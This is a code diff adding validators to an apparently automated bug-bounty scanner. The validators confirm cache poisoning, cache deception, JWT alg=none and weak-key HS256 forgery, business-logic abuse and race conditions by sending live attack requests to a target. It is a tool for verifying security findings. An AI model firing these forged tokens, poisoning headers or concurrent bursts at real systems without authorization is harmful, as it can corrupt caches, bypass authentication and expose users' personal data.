@@ -2762,25 +2762,731 @@ registerValidator({
   },
 });
 
+// ─── P2-2: Cache Poisoning Validator ────────────────────────────────────────
+// Three-step proof per docs/RESEARCH_H1_REPORT_QUALITY.md §8:
+//   (1) poison: send request with cache buster + attacker header (X-Forwarded-Host)
+//   (2) verify cache: check CF-Cache-Status / X-Cache / Age header signals HIT
+//   (3) prove propagation: a clean request (no attacker header) returns the
+//       attacker-controlled content
+// Without all three, the finding is structurally weak (per H1 Decision Matrix
+// it would be auto-rejected as "header reflection without cache storage proof").
+
+const CACHE_POISON_HEADERS: Array<[string, string]> = [
+  ['X-Forwarded-Host', 'huntress-canary'],
+  ['X-Forwarded-Server', 'huntress-canary'],
+  ['X-Original-URL', '/huntress-canary'],
+  ['X-Rewrite-URL', '/huntress-canary'],
+  ['X-Host', 'huntress-canary'],
+];
+
+/** Detect cache-hit signal in raw HTTP response headers. */
+function detectCacheHit(rawResponse: string): { hit: boolean; signal: string } {
+  const lines = rawResponse.split(/\r?\n/);
+  for (const line of lines) {
+    if (/^(cf-cache-status|x-cache|x-served-by-cache|x-drupal-cache):\s*hit/i.test(line)) {
+      return { hit: true, signal: line.trim() };
+    }
+    if (/^age:\s*[1-9]\d*/i.test(line)) {
+      return { hit: true, signal: line.trim() };
+    }
+  }
+  return { hit: false, signal: '' };
+}
+
+registerValidator({
+  vulnType: 'cache_poisoning',
+  async validate(finding, config): Promise<ValidationResult> {
+    const startTime = Date.now();
+    const evidence: ValidationEvidence[] = [];
+    const steps: string[] = [];
+
+    // Generate a per-run canary so we can prove the poisoned response is OUR
+    // poison, not pre-existing cache content.
+    const canary = `hcp-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 9)}`;
+    const url = finding.target;
+    const buster = `_hcb=${canary}`;
+    const cbUrl = url.includes('?') ? `${url}&${buster}` : `${url}?${buster}`;
+
+    let confirmedSignal = '';
+    let confirmedHeader = '';
+
+    for (const [hdrName, hdrPrefix] of CACHE_POISON_HEADERS) {
+      const attackerValue = `${hdrPrefix}-${canary}.example.com`;
+      steps.push(`Step 1: poison request with ${hdrName}: ${attackerValue}`);
+
+      // Step 1: poison
+      await config.executeCommand(
+        buildCurlArgv({
+          url: cbUrl,
+          headers: { [hdrName]: attackerValue },
+          dumpHeaders: true,
+          authHeaders: config.authHeaders, authCookies: config.authCookies,
+        }),
+        url,
+      );
+
+      // Step 2: brief wait so the cache tier commits
+      await sleep(1000);
+
+      // Step 3: clean follow-up — no attacker header — same buster URL
+      steps.push(`Step 3: clean GET to same buster URL — must return poisoned content + cache HIT`);
+      const cleanResult = await config.executeCommand(
+        buildCurlArgv({
+          url: cbUrl,
+          dumpHeaders: true,
+          authHeaders: config.authHeaders, authCookies: config.authCookies,
+        }),
+        url,
+      );
+
+      const cacheState = detectCacheHit(cleanResult.stdout);
+      const containsCanary = cleanResult.stdout.includes(canary)
+        || cleanResult.stdout.includes(attackerValue);
+
+      steps.push(`  cache hit: ${cacheState.hit ? cacheState.signal : 'NO'}`);
+      steps.push(`  attacker content in clean response: ${containsCanary ? 'YES' : 'no'}`);
+
+      if (cacheState.hit && containsCanary) {
+        confirmedSignal = cacheState.signal;
+        confirmedHeader = hdrName;
+        evidence.push({
+          type: 'http_response',
+          description: `Clean request returned poisoned content via ${hdrName}; cache signal: ${cacheState.signal}`,
+          data: cleanResult.stdout.substring(0, 5000),
+          timestamp: Date.now(),
+        });
+        evidence.push({
+          type: 'http_request',
+          description: `Poison vector: ${hdrName}: ${attackerValue}`,
+          data: `${hdrName}: ${attackerValue}`,
+          timestamp: Date.now(),
+        });
+        break;
+      }
+    }
+
+    const confirmed = confirmedHeader.length > 0;
+    let confidence = finding.confidence;
+    if (confirmed) confidence = Math.min(100, confidence + 35);
+    else confidence = Math.max(0, confidence - 20);
+
+    return {
+      findingId: finding.id,
+      confirmed,
+      evidence,
+      reproductionSteps: steps,
+      confidence,
+      validatorUsed: confirmed ? `cache_poisoning_via_${confirmedHeader.toLowerCase()}` : 'cache_poisoning',
+      validationTime: Date.now() - startTime,
+    };
+  },
+});
+
+// ─── P2-2: Cache Deception Validator ────────────────────────────────────────
+// Cache deception (Omer Gil) tricks a cache into storing a dynamic auth'd
+// response under a static-looking URL, which an unauth attacker can then
+// retrieve. Detection without two sessions is best-effort: confirm that an
+// extension-suffixed variant of the URL (a) returns auth-content (PII/user
+// indicators) and (b) gets cached. Two-session ownership-differential
+// confirmation is added when secondaryAuthHeaders are configured.
+
+const CACHE_DECEPTION_EXTENSIONS = ['.css', '.png', '.jpg', '.js', '.svg'];
+
+const PII_INDICATORS = [
+  /"email"\s*:\s*"[^"]+@/i,
+  /"username"\s*:\s*"/i,
+  /"user_id"\s*:\s*\d+/i,
+  /"session_token"|"api_key"|"access_token"/i,
+  /\bemail\s*=\s*\S+@\S+/i,
+];
+
+registerValidator({
+  vulnType: 'cache_deception',
+  async validate(finding, config): Promise<ValidationResult> {
+    const startTime = Date.now();
+    const evidence: ValidationEvidence[] = [];
+    const steps: string[] = [];
+
+    const url = finding.target;
+
+    let confirmed = false;
+    let confirmingExt = '';
+
+    for (const ext of CACHE_DECEPTION_EXTENSIONS) {
+      // Append the extension to the path. If URL has a trailing slash, just add ext.
+      // If it has a query string, append ext before the ?
+      let probeUrl: string;
+      try {
+        const u = new URL(url);
+        const newPath = u.pathname.endsWith('/') ? `${u.pathname}deception${ext}` : `${u.pathname}/deception${ext}`;
+        u.pathname = newPath;
+        probeUrl = u.toString();
+      } catch {
+        probeUrl = url + (url.endsWith('/') ? `deception${ext}` : `/deception${ext}`);
+      }
+
+      steps.push(`Authenticated probe → ${probeUrl}`);
+      const authResult = await config.executeCommand(
+        buildCurlArgv({
+          url: probeUrl,
+          dumpHeaders: true,
+          authHeaders: config.authHeaders, authCookies: config.authCookies,
+        }),
+        url,
+      );
+
+      const cacheState = detectCacheHit(authResult.stdout);
+      const piiMatch = PII_INDICATORS.some(p => p.test(authResult.stdout));
+
+      steps.push(`  cache: ${cacheState.hit ? cacheState.signal : 'no hit'}, PII indicators: ${piiMatch ? 'YES' : 'no'}`);
+
+      // Strong confirmation: secondary identity (or unauth) gets the same auth'd content
+      if (cacheState.hit && piiMatch) {
+        evidence.push({
+          type: 'http_response',
+          description: `Authenticated ${ext} probe cached + contains PII`,
+          data: authResult.stdout.substring(0, 5000),
+          timestamp: Date.now(),
+        });
+
+        // Try unauth or secondary identity to prove the cached content is reachable
+        // without auth. If we have a secondary session, use it; otherwise drop auth headers.
+        const useSecondary = !!(config.secondaryAuthHeaders || config.secondaryAuthCookies);
+        const unauthResult = await config.executeCommand(
+          buildCurlArgv({
+            url: probeUrl,
+            dumpHeaders: true,
+            authHeaders: useSecondary ? config.secondaryAuthHeaders : undefined,
+            authCookies: useSecondary ? config.secondaryAuthCookies : undefined,
+          }),
+          url,
+        );
+        const unauthHasPii = PII_INDICATORS.some(p => p.test(unauthResult.stdout));
+        steps.push(`  ${useSecondary ? 'Secondary' : 'Unauth'} re-fetch: PII present: ${unauthHasPii ? 'YES' : 'no'}`);
+
+        if (unauthHasPii) {
+          evidence.push({
+            type: 'http_response',
+            description: `${useSecondary ? 'Secondary identity' : 'Unauthenticated client'} retrieved cached PII via ${ext}`,
+            data: unauthResult.stdout.substring(0, 5000),
+            timestamp: Date.now(),
+          });
+          confirmed = true;
+          confirmingExt = ext;
+          break;
+        }
+      }
+    }
+
+    let confidence = finding.confidence;
+    if (confirmed) confidence = Math.min(100, confidence + 35);
+    else confidence = Math.max(0, confidence - 15);
+
+    return {
+      findingId: finding.id,
+      confirmed,
+      evidence,
+      reproductionSteps: steps,
+      confidence,
+      validatorUsed: confirmed ? `cache_deception_via_${confirmingExt.replace('.', '')}` : 'cache_deception',
+      validationTime: Date.now() - startTime,
+    };
+  },
+});
+
+// ─── P2-2: JWT alg=none Validator ───────────────────────────────────────────
+// Strip the signature, set alg=none, replay. If the server accepts the token
+// (responds 2xx where the original request needed auth), the JWT validator
+// is unsigned-token-vulnerable. We detect a JWT in either the agent-supplied
+// finding evidence OR the active hunt's Authorization header.
+
+/** Base64URL encode a string (no padding). */
+function b64urlEncode(input: string): string {
+  return Buffer.from(input, 'utf-8').toString('base64')
+    .replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_');
+}
+
+/** Base64URL decode → utf-8 string; returns null on invalid input. */
+function b64urlDecode(input: string): string | null {
+  try {
+    const padded = input.replace(/-/g, '+').replace(/_/g, '/') + '='.repeat((4 - input.length % 4) % 4);
+    return Buffer.from(padded, 'base64').toString('utf-8');
+  } catch { return null; }
+}
+
+/** Find a JWT-shaped string anywhere in the finding's evidence + active auth headers. */
+function findJwt(finding: ReactFinding, config: ValidatorConfig): { token: string; sourceHeader: string } | null {
+  const jwtPattern = /eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/;
+  // 1. Authorization header on the active hunt
+  const authHeader = config.authHeaders?.['Authorization'] ?? config.authHeaders?.['authorization'];
+  if (authHeader) {
+    const m = authHeader.match(jwtPattern);
+    if (m) return { token: m[0], sourceHeader: 'Authorization' };
+  }
+  // 2. Other auth headers
+  for (const [k, v] of Object.entries(config.authHeaders ?? {})) {
+    const m = v.match(jwtPattern);
+    if (m) return { token: m[0], sourceHeader: k };
+  }
+  // 3. The finding's evidence array (string array per ReactFinding shape)
+  for (const ev of finding.evidence ?? []) {
+    if (typeof ev !== 'string') continue;
+    const m = ev.match(jwtPattern);
+    if (m) return { token: m[0], sourceHeader: 'finding-evidence' };
+  }
+  return null;
+}
+
+registerValidator({
+  vulnType: 'jwt_none',
+  async validate(finding, config): Promise<ValidationResult> {
+    const startTime = Date.now();
+    const evidence: ValidationEvidence[] = [];
+    const steps: string[] = [];
+
+    const found = findJwt(finding, config);
+    if (!found) {
+      steps.push('No JWT found in finding evidence or active auth headers — cannot forge');
+      return {
+        findingId: finding.id,
+        confirmed: false,
+        evidence,
+        reproductionSteps: steps,
+        confidence: Math.max(0, finding.confidence - 20),
+        validatorUsed: 'jwt_none_no_token',
+        validationTime: Date.now() - startTime,
+      };
+    }
+
+    const parts = found.token.split('.');
+    const payloadJson = b64urlDecode(parts[1]);
+    if (!payloadJson) {
+      steps.push('JWT payload not decodable — abort');
+      return {
+        findingId: finding.id,
+        confirmed: false,
+        evidence,
+        reproductionSteps: steps,
+        confidence: Math.max(0, finding.confidence - 20),
+        validatorUsed: 'jwt_none_decode_failed',
+        validationTime: Date.now() - startTime,
+      };
+    }
+
+    // Forge: header alg=none, same payload, empty signature
+    const forgedHeader = b64urlEncode(JSON.stringify({ alg: 'none', typ: 'JWT' }));
+    const forgedToken = `${forgedHeader}.${parts[1]}.`;
+    steps.push(`Forged alg=none token (header=${forgedHeader}, signature=empty)`);
+
+    // Baseline: replay with original token, get expected response
+    const baseline = await config.executeCommand(
+      buildCurlArgv({
+        url: finding.target,
+        headers: { Authorization: `Bearer ${found.token}` },
+      }),
+      finding.target,
+    );
+    const baseStatus = (baseline.stdout.match(/HTTP\/[\d.]+\s+(\d+)/) ?? [])[1] ?? '?';
+    steps.push(`Baseline (original token): HTTP ${baseStatus}, ${baseline.stdout.length} bytes`);
+
+    // Forged: replay with alg=none token
+    const forged = await config.executeCommand(
+      buildCurlArgv({
+        url: finding.target,
+        headers: { Authorization: `Bearer ${forgedToken}` },
+      }),
+      finding.target,
+    );
+    const forgedStatus = (forged.stdout.match(/HTTP\/[\d.]+\s+(\d+)/) ?? [])[1] ?? '?';
+    steps.push(`Forged (alg=none): HTTP ${forgedStatus}, ${forged.stdout.length} bytes`);
+
+    evidence.push({
+      type: 'http_request',
+      description: 'Forged alg=none JWT replay',
+      data: `Original: ${found.token.substring(0, 60)}...\nForged:  ${forgedToken.substring(0, 60)}...`,
+      timestamp: Date.now(),
+    });
+    evidence.push({
+      type: 'http_response',
+      description: `Forged-token response (HTTP ${forgedStatus})`,
+      data: forged.stdout.substring(0, 5000),
+      timestamp: Date.now(),
+    });
+
+    // Confirmed if forged token returns 2xx (auth bypass). 401/403 means the
+    // server rejected the alg=none gracefully. Any 5xx signals a parser
+    // exception worth noting but not confirming on its own.
+    const forgedStatusNum = parseInt(forgedStatus, 10);
+    const confirmed = !isNaN(forgedStatusNum) && forgedStatusNum >= 200 && forgedStatusNum < 400;
+
+    let confidence = finding.confidence;
+    if (confirmed) confidence = Math.min(100, confidence + 50);
+    else confidence = Math.max(0, confidence - 25);
+
+    steps.push(confirmed
+      ? `✓ CONFIRMED: alg=none token accepted by server (HTTP ${forgedStatus})`
+      : `Server rejected alg=none token (HTTP ${forgedStatus}) — finding likely false positive`);
+
+    return {
+      findingId: finding.id,
+      confirmed,
+      evidence,
+      reproductionSteps: steps,
+      confidence,
+      validatorUsed: confirmed ? 'jwt_none_confirmed' : 'jwt_none_rejected',
+      validationTime: Date.now() - startTime,
+    };
+  },
+});
+
+// ─── P2-2: JWT alg confusion Validator ──────────────────────────────────────
+// Try HS256 with empty key as the signing secret. If the server uses the same
+// crypto library to verify HS256 tokens that it does for the original alg
+// (RS256), and doesn't pin the alg, an empty/known-string HMAC may be accepted.
+// Stronger variant (RS256 → HS256 with public key as secret) requires the
+// public key — out of scope here without target-specific knowledge.
+
+registerValidator({
+  vulnType: 'jwt_alg_confusion',
+  async validate(finding, config): Promise<ValidationResult> {
+    const startTime = Date.now();
+    const evidence: ValidationEvidence[] = [];
+    const steps: string[] = [];
+
+    const found = findJwt(finding, config);
+    if (!found) {
+      return {
+        findingId: finding.id,
+        confirmed: false,
+        evidence,
+        reproductionSteps: ['No JWT found — cannot test alg confusion'],
+        confidence: Math.max(0, finding.confidence - 20),
+        validatorUsed: 'jwt_alg_confusion_no_token',
+        validationTime: Date.now() - startTime,
+      };
+    }
+
+    const parts = found.token.split('.');
+    if (parts.length !== 3) {
+      return {
+        findingId: finding.id,
+        confirmed: false,
+        evidence,
+        reproductionSteps: ['JWT does not have 3 parts — cannot forge'],
+        confidence: Math.max(0, finding.confidence - 20),
+        validatorUsed: 'jwt_alg_confusion_malformed',
+        validationTime: Date.now() - startTime,
+      };
+    }
+
+    // Try multiple known weak HMAC keys + empty
+    const weakKeys = ['', 'secret', 'changeme', 'jwt_secret', 'your-256-bit-secret'];
+    let confirmed = false;
+    let confirmingKey = '';
+    let confirmingStatus = '';
+
+    for (const key of weakKeys) {
+      const forgedHeader = b64urlEncode(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
+      const signingInput = `${forgedHeader}.${parts[1]}`;
+      // HMAC-SHA256(signingInput, key) → b64url
+      const crypto = await import('node:crypto').catch(() => null);
+      if (!crypto) {
+        steps.push('node:crypto unavailable — cannot compute HS256 signature');
+        break;
+      }
+      const sig = crypto.createHmac('sha256', key).update(signingInput).digest('base64')
+        .replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_');
+      const forged = `${signingInput}.${sig}`;
+
+      steps.push(`Trying HS256 with key='${key === '' ? '<empty>' : key}'`);
+      const result = await config.executeCommand(
+        buildCurlArgv({
+          url: finding.target,
+          headers: { Authorization: `Bearer ${forged}` },
+        }),
+        finding.target,
+      );
+      const status = (result.stdout.match(/HTTP\/[\d.]+\s+(\d+)/) ?? [])[1] ?? '?';
+      steps.push(`  → HTTP ${status}`);
+
+      const statusNum = parseInt(status, 10);
+      if (!isNaN(statusNum) && statusNum >= 200 && statusNum < 400) {
+        confirmed = true;
+        confirmingKey = key;
+        confirmingStatus = status;
+        evidence.push({
+          type: 'http_request',
+          description: `Forged HS256 token (alg confusion) accepted with key='${key}'`,
+          data: `Forged token: ${forged.substring(0, 80)}...`,
+          timestamp: Date.now(),
+        });
+        evidence.push({
+          type: 'http_response',
+          description: `Server accepted forged HS256 (HTTP ${status})`,
+          data: result.stdout.substring(0, 5000),
+          timestamp: Date.now(),
+        });
+        break;
+      }
+    }
+
+    let confidence = finding.confidence;
+    if (confirmed) confidence = Math.min(100, confidence + 50);
+    else confidence = Math.max(0, confidence - 15);
+
+    steps.push(confirmed
+      ? `✓ CONFIRMED: alg confusion accepted (key='${confirmingKey}', HTTP ${confirmingStatus})`
+      : `Server rejected all forged HS256 attempts`);
+
+    return {
+      findingId: finding.id,
+      confirmed,
+      evidence,
+      reproductionSteps: steps,
+      confidence,
+      validatorUsed: confirmed ? 'jwt_alg_confusion_confirmed' : 'jwt_alg_confusion_rejected',
+      validationTime: Date.now() - startTime,
+    };
+  },
+});
+
+// ─── P2-2: Business Logic Validator ─────────────────────────────────────────
+// Pattern-based: replay the agent's payload, verify (a) response is 2xx,
+// (b) no validation-error keywords in body, (c) the URL/payload contains a
+// known business-logic abuse marker (negative quantity, zero price, oversized
+// integer, currency manipulation). Without target-specific knowledge this is
+// heuristic, but it lifts business_logic out of pure pass-through.
+
+const BUSINESS_LOGIC_ABUSE_MARKERS = [
+  { label: 'negative quantity', pattern: /\b(quantity|qty|amount|count|num)\s*=\s*-\d+/i },
+  { label: 'zero price', pattern: /\b(price|cost|total|fee|charge)\s*=\s*0(\.\d+)?\b/i },
+  { label: 'oversized integer', pattern: /=\d{10,}/ },
+  { label: 'negative currency', pattern: /\bcurrency\s*=\s*-/i },
+  { label: 'free coupon', pattern: /\b(coupon|discount|promo)\s*=\s*100/i },
+  { label: 'workflow skip', pattern: /\b(step|stage|status)\s*=\s*(complete|paid|approved|verified)/i },
+];
+
+const VALIDATION_ERROR_KEYWORDS = [
+  /\binvalid\b/i, /\bmust\s+be\s+(positive|greater\s+than|at\s+least)/i,
+  /\bout\s+of\s+range/i, /\bnot\s+allowed/i, /\bvalidation\s+(error|failed)/i,
+  /\bbad\s+request/i, /\bmalformed/i, /\brejected/i,
+];
+
+registerValidator({
+  vulnType: 'business_logic',
+  async validate(finding, config): Promise<ValidationResult> {
+    const startTime = Date.now();
+    const evidence: ValidationEvidence[] = [];
+    const steps: string[] = [];
+
+    // Pattern check: does the target/payload contain a known abuse marker?
+    const haystack = finding.target + '\n' + (finding.evidence ?? []).join('\n');
+    const matchedMarkers = BUSINESS_LOGIC_ABUSE_MARKERS
+      .filter(m => m.pattern.test(haystack))
+      .map(m => m.label);
+    steps.push(`Abuse markers detected in finding: ${matchedMarkers.length === 0 ? 'none' : matchedMarkers.join(', ')}`);
+
+    // Replay the request as-is (the agent already constructed the abusive payload)
+    const result = await config.executeCommand(
+      buildCurlArgv({
+        url: finding.target,
+        dumpHeaders: true,
+        authHeaders: config.authHeaders, authCookies: config.authCookies,
+      }),
+      finding.target,
+    );
+
+    const statusMatch = result.stdout.match(/HTTP\/[\d.]+\s+(\d+)/);
+    const status = statusMatch ? parseInt(statusMatch[1], 10) : 0;
+    const isAccepted = status >= 200 && status < 400;
+    const matchedRejections = VALIDATION_ERROR_KEYWORDS.filter(p => p.test(result.stdout)).map(p => p.source);
+    const wasRejected = matchedRejections.length > 0;
+
+    steps.push(`Replay status: HTTP ${status}, accepted=${isAccepted}, rejection-keywords=${matchedRejections.length}`);
+
+    evidence.push({
+      type: 'http_response',
+      description: `Business-logic payload replay (HTTP ${status})`,
+      data: result.stdout.substring(0, 5000),
+      timestamp: Date.now(),
+    });
+
+    // Confirmed when ALL of: a marker hit, response was accepted, and no
+    // rejection keyword appeared. This rules out the common false-positive
+    // pattern where the server accepts the request shape but returns a
+    // logical error like "must be positive".
+    const confirmed = matchedMarkers.length > 0 && isAccepted && !wasRejected;
+
+    let confidence = finding.confidence;
+    if (confirmed) confidence = Math.min(100, confidence + 30);
+    else if (wasRejected) confidence = Math.max(0, confidence - 30);
+    else if (matchedMarkers.length === 0) confidence = Math.max(0, confidence - 15);
+
+    return {
+      findingId: finding.id,
+      confirmed,
+      evidence,
+      reproductionSteps: steps,
+      confidence,
+      validatorUsed: confirmed
+        ? `business_logic_${matchedMarkers[0].replace(/\s+/g, '_')}`
+        : wasRejected
+          ? 'business_logic_rejected'
+          : 'business_logic_inconclusive',
+      validationTime: Date.now() - startTime,
+    };
+  },
+});
+
+// ─── P2-2: Race Condition Validator ─────────────────────────────────────────
+// Fire N=20 concurrent identical requests via Promise.all. Count 2xx vs 4xx
+// responses. For a state-changing operation that should be one-shot (apply
+// coupon, vote, debit balance), more than 1 success is the smoking gun. The
+// classic single-packet HTTP/2 attack is more reliable but requires a proper
+// HTTP/2 client; this Promise.all approach catches the common case where the
+// server has no row-lock at all.
+
+const CONCURRENT_REQUEST_COUNT = 20;
+
+registerValidator({
+  vulnType: 'race_condition',
+  async validate(finding, config): Promise<ValidationResult> {
+    const startTime = Date.now();
+    const evidence: ValidationEvidence[] = [];
+    const steps: string[] = [];
+
+    steps.push(`Firing ${CONCURRENT_REQUEST_COUNT} concurrent requests to: ${finding.target}`);
+
+    const buildProbe = () => buildCurlArgv({
+      url: finding.target,
+      dumpHeaders: true,
+      authHeaders: config.authHeaders, authCookies: config.authCookies,
+    });
+
+    // Fire all at once via Promise.all — node's event loop kicks them off
+    // simultaneously. Not as tight as HTTP/2 single-packet but catches the
+    // "no row lock at all" case which is the most common race-condition
+    // class on H1.
+    const results = await Promise.all(
+      Array.from({ length: CONCURRENT_REQUEST_COUNT }, () =>
+        config.executeCommand(buildProbe(), finding.target),
+      ),
+    );
+
+    const statusCounts: Record<string, number> = {};
+    let twoXxCount = 0;
+    let fourXxCount = 0;
+    let conflictCount = 0;
+    for (const r of results) {
+      const m = r.stdout.match(/HTTP\/[\d.]+\s+(\d+)/);
+      const status = m ? m[1] : '?';
+      statusCounts[status] = (statusCounts[status] ?? 0) + 1;
+      const num = parseInt(status, 10);
+      if (!isNaN(num)) {
+        if (num >= 200 && num < 300) twoXxCount++;
+        else if (num >= 400 && num < 500) fourXxCount++;
+        if (num === 409) conflictCount++;
+      }
+    }
+
+    steps.push(`Status distribution: ${Object.entries(statusCounts).map(([s, c]) => `${s}×${c}`).join(', ')}`);
+    steps.push(`2xx successes: ${twoXxCount}, 4xx rejections: ${fourXxCount}, 409 Conflict: ${conflictCount}`);
+
+    evidence.push({
+      type: 'http_response',
+      description: `Race condition probe — ${CONCURRENT_REQUEST_COUNT} concurrent requests`,
+      data: `Status distribution: ${JSON.stringify(statusCounts)}\nFirst response (truncated):\n${results[0]?.stdout.substring(0, 2000) ?? ''}`,
+      timestamp: Date.now(),
+    });
+
+    // Confirmation logic:
+    //   - twoXxCount > 1 AND no 409 returned: server has no rate/lock at all
+    //     → strong race-condition signal (the operation that should be one-shot
+    //     succeeded multiple times in parallel)
+    //   - twoXxCount == 1 AND fourXxCount > 0: server correctly serialized
+    //     → finding likely false positive
+    //   - all twoXxCount: idempotent endpoint, race not applicable
+    const allSucceeded = twoXxCount === CONCURRENT_REQUEST_COUNT;
+    const confirmed = twoXxCount > 1 && !allSucceeded && conflictCount === 0;
+
+    let confidence = finding.confidence;
+    if (confirmed) confidence = Math.min(100, confidence + 30);
+    else if (twoXxCount === 1) confidence = Math.max(0, confidence - 25);
+    else if (conflictCount > 0) confidence = Math.max(0, confidence - 15);
+
+    return {
+      findingId: finding.id,
+      confirmed,
+      evidence,
+      reproductionSteps: steps,
+      confidence,
+      validatorUsed: confirmed
+        ? `race_condition_${twoXxCount}_of_${CONCURRENT_REQUEST_COUNT}`
+        : allSucceeded
+          ? 'race_condition_idempotent'
+          : conflictCount > 0
+            ? 'race_condition_serialized'
+            : 'race_condition_inconclusive',
+      validationTime: Date.now() - startTime,
+    };
+  },
+});
+
+// ─── P2-2: Blind-variant aliases ────────────────────────────────────────────
+// `ssrf_blind`, `xxe_blind`, `command_injection_blind` are functionally
+// identical to their non-blind counterparts (the deterministic validators
+// already use OOB callbacks for confirmation — see `ssrf`, `xxe`,
+// `command_injection` validators above). The "blind" suffix just signals
+// that the agent saw no echo in the response, but the validator's OOB
+// path is the authoritative confirmation either way.
+//
+// `registerAlias` re-uses the existing validator's logic at lookup time
+// (no refactor of the production validators) and tags the result with a
+// `_blind` suffix so consumers can tell which variant fired.
+function registerAlias(aliasType: string, sourceType: string): void {
+  registerValidator({
+    vulnType: aliasType,
+    async validate(finding, config): Promise<ValidationResult> {
+      const source = validators.get(sourceType);
+      if (!source) {
+        return {
+          findingId: finding.id,
+          confirmed: false,
+          evidence: [],
+          reproductionSteps: [],
+          confidence: finding.confidence,
+          validatorUsed: 'none',
+          validationTime: 0,
+          error: `Alias source validator '${sourceType}' is not registered`,
+        };
+      }
+      const result = await source.validate(finding, config);
+      return { ...result, validatorUsed: `${result.validatorUsed}_blind` };
+    },
+  });
+}
+registerAlias('ssrf_blind', 'ssrf');
+registerAlias('xxe_blind', 'xxe');
+registerAlias('command_injection_blind', 'command_injection');
+
 // ─── Pass-through validators for remaining types ──────────────────────────
 // These use the agent's confidence without additional validation
 
 for (const vulnType of [
   'sqli_blind_boolean',
-  'ssrf_blind',
   'csrf',
   'oauth_redirect_uri', 'oauth_state', 'oauth_pkce',
   'jwt_vulnerability',
   'information_disclosure', 'rate_limit_bypass',
   'graphql_introspection', 'graphql_batching',
   'mass_assignment', 'rce',
-  'xxe_blind', 'command_injection_blind', 'lfi', 'lfi_rce',
-  'race_condition', 'toctou', 'double_spend',
-  'http_smuggling', 'cache_poisoning', 'cache_deception',
-  'jwt_alg_confusion', 'jwt_none', 'jwt_kid_injection',
+  'lfi', 'lfi_rce',
+  'toctou', 'double_spend',
+  'http_smuggling',
+  'jwt_kid_injection',
   'deserialization', 'saml_attack',
   'mfa_bypass', 'websocket', 'crlf_injection',
-  'prompt_injection', 'business_logic',
+  'prompt_injection',
   'other',
 ]) {
   registerValidator({
